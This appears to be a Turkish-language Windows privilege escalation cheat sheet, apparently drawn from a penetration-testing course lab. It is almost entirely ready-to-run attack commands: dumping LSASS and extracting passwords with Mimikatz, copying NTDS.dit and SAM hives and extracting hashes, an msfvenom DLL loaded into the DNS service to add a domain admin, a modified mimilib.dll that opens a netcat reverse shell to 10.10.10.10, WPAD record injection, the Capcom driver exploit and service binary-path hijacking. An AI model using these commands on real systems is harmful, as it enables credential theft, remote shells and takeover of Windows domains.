---
{"dg-publish":true,"permalink":"/cheat-sheet/windows-privilege-escalation/"}
---


### 1- Çalışan Process'leri Görme

```cmd-session
tasklist /svc
```


### 2-**Tüm Ortam Değişkenlerini Göster**  

```cmd-session
set
```


### 3-**Ayrıntılı Yapılandırma Bilgilerini Görüntüleme**  
```cmd-session
systeminfo
```


### 4- Yamalar ve Güncellemeler'i Kontrol Etme (wmic or Get-Hotfix)

```cmd-session
wmic qfe
```

```powershell-session
Get-HotFix | ft -AutoSize
```


### 5-**Yüklü Programlar**  

```cmd-session
wmic product get name
```

```powershell-session
Get-WmiObject -Class Win32_Product |  select Name, Version
```


### 6-**Çalışan Prosesleri Görüntüleme**  ve Tespit Etme

```cmd-session
netstat -ano
```

```cmd-session
tasklist /FI "PID eq 1234"
```


### 7-**Oturum Açmış Kullanıcılar**  Tespit Etme

```cmd-session
query user
```


### 8-**Mevcut Kullanıcı**yı Tespit Etme

```cmd-session
 echo %USERNAME%
```


### 9- Mevcut Kullanıcı Ayrıcalıkları Görüntüleme

```cmd-session
whoami /priv
```

### 10-**Güncel Kullanıcı Grubu Bilgileri**  Alma

```cmd-session
whoami /groups
```


### 11-**Tüm Kullanıcıları Getir**  

```cmd-session
net user
```


### 12-Tüm Grupları Getir

```cmd-session
net localgroup
```


### 13-**Bir Grup Hakkında Ayrıntılar**  

```cmd-session
net localgroup administrators
```

### 14-**Şifre Politikası ve Diğer Hesap Bilgilerini Alın**

```cmd-session
net accounts
```


### 15-**Pipelist ile Adlandırılmış Pipe'ları Listeleme**

```cmd-session
pipelist.exe /accepteula
```

### 16-Powershell ile Name Pipe'ları Listeleme

```powershell-session
gci \\.\pipe\
```

### 17-**LSASS Named Pipe İzinlerini Gösterme** (Örnek LSASS)

```cmd-session
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

### 18-**WindscribeService Named Pipe İzinlerini Kontrol Etme** (Yazma İzinleri)

```cmd-session
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

\pipe\SQLLocal\SQLEXPRESS01

accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v


### Procdump ile LSASS Proses Memory Dump

```cmd-session
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### LSASS Dump'tan Logon Parolalarını Almak için Mimikatz'ı Kullanma

```cmd-session
mimikatz.exe

mimikatz # log

mimikatz # sekurlsa::minidump lsass.dmp

mimikatz # sekurlsa::logonpasswords

```

ImpersonateFromParentPid -ppid 1234 -command C:\Windows\System32\cmd.exe -cmdargs "/k"



### **SeTakeOwnershipPrivilege'ı Etkinleştirme**  (Disabled ise)

```powershell-session
Import-Module .\Enable-Privilege.ps1

.\EnableAllTokenPrivs.ps1
```


### Dosya Özelliklerini ve Sahibinin Bilgilerini Görüntüleme

```powershell-session
Get-ChildItem -Path 'C:\Your\Path\To\File.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```


### **Dosya Sahipliğini Kontrol Etme** -2

```powershell-session
cmd /c dir /q 'C:\Your\Path\To\File.txt'
```


### **Dosyanın Sahipliğini Alma**  

```powershell-session
takeown /f 'C:\Your\Path\To\File.txt'
```

### **Sahipliğin Değiştiğini Onaylama**  

```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Your\Path\To\File.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```


### **Dosya ACL'sini Değiştirme**  

```powershell-session
icacls 'C:\Your\Path\To\File.txt' /grant htb-student:F
```


### SeBackupPrivilege Modüllerini Yükleme

```powershell-session
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```


### SeBackupPrivilege Hakkını Kontrol Etme

```powershell-session
Get-SeBackupPrivilege
```

### **SeBackupPrivilege'ı Etkinleştirme**

```powershell-session
Set-SeBackupPrivilege
```

### **Korumalı Bir Dosyayı Kopyalama**

```powershell-session
Copy-FileSeBackupPrivilege 'Kaynak Dosya Yolu' 'Hedef Dosya Yolu'
```


### **Domain Controller'a Saldırma - NTDS.dit'i Kopyalama**  ve **NTDS.dit Dosyasının Local Olarak Kopyalanması**  

```powershell-session
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

```powershell-session
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\ntds.dit
```


### **SAM ve SYSTEM Kayıt Defteri Kovanlarını Yedekleme**

```cmd-session
reg save HKLM\SYSTEM SYSTEM.SAV

reg save HKLM\SAM SAM.SAV
```


### **NTDS.dit'ten Kimlik Bilgilerini Çıkarma**  (DSInternals)

```powershell-session
Import-Module .\DSInternals.psd1

$key = Get-BootKey -SystemHivePath .\SYSTEM

Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### **SecretsDump Kullanarak Hash'leri Çıkarma**

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### **Robocopy ile Dosya Kopyalama**

```cmd-session
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```


### Event Log Readers Grubu Üyelerini Listeleme

```cmd-session
net localgroup "Event Log Readers"
```


### **wevtutil Kullanarak Security Loglarını Arama** (Local)

```powershell-session
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

### Remote Bilgisayarda Güvenlik Günlüğünü Kimlik Bilgileriyle Sorgulama

```cmd-session
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

### **Get-WinEvent Kullanarak Security Logs'ta Arama Yapma**

```powershell-session
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```


----

### **Malicious DLL Oluşturma**  

```shell-session
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```


### **Özel DLL Yükleme**

```cmd-session
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```


### **Kullanıcının SID'sini Bulma**  

```cmd-session
wmic useraccount where name="netadm" get sid
```


### **DNS Hizmetinde İzinleri Denetleme**

```cmd-session
sc.exe sdshow DNS
```


### **DNS Servisini Durdurma**

```cmd-session
sc stop dns
```


### **DNS Servisini Başlatma**

```cmd-session
sc start dns
```


### **Grup Üyeliğinin Onaylanması**

```cmd-session
net group "Domain Admins" /dom
```


---

## **Temizlik**  


### **Registry Key Eklendiğini Onaylama**  veya Görme

```cmd-session
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```


### Deleting Registry Key (adduser.dll --> ServerLevelPluginDll'de)

```cmd-session
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```


### Starting the DNS Service Again

```cmd-session
sc.exe start dns
```

### Checking DNS Service Status

```cmd-session
sc query dns
```

---


## **Mimilib.dll kullanarak** (system kısmı düzenle)

```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("nc 10.10.10.10 9999 -e cmd.exe");
	}
	return ERROR_SUCCESS;
}
```


### **Global Sorgu Blok Listesini Devre Dışı Bırakma**

```powershell-session
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```


### **WPAD Record'u Ekleme**

```powershell-session
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```



---

### **Driver'a Referans Ekleme**

```cmd-session
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

```


### **Sürücünün Yüklü Olmadığını Doğrulayın**  

```powershell-session
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

### **Ayrıcalığın Etkinleştirildiğini Doğrulayın**  

```cmd-session
EnableSeLoadDriverPrivilege.exe
```


### **Capcom Driver'ın Listelendiğini Doğrulayın**  

```powershell-session
.\DriverView.exe /stext drivers.txt

cat drivers.txt | Select-String -pattern Capcom
```


### **Ayrıcalıkları Yükseltmek için ExploitCapcom Aracını Kullanın**  

```powershell-session
.\ExploitCapcom.exe
```



---

### **AppReadiness Service'i Sorgulama**  

```cmd-session
sc qc AppReadiness
```


### **PsService ile Servis İzinlerini Kontrol Etme**  

```cmd-session
c:\Tools\PsService.exe security AppReadiness
```


### **Local Admin Grup Üyeliğini Kontrol Etme**

```cmd-session
net localgroup Administrators
```


### **Service Binary Yolunun Değiştirilmesi**

```cmd-session
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```


### Starting the Service (Değişikliğin Olması için)

```cmd-session
sc start AppReadiness
```

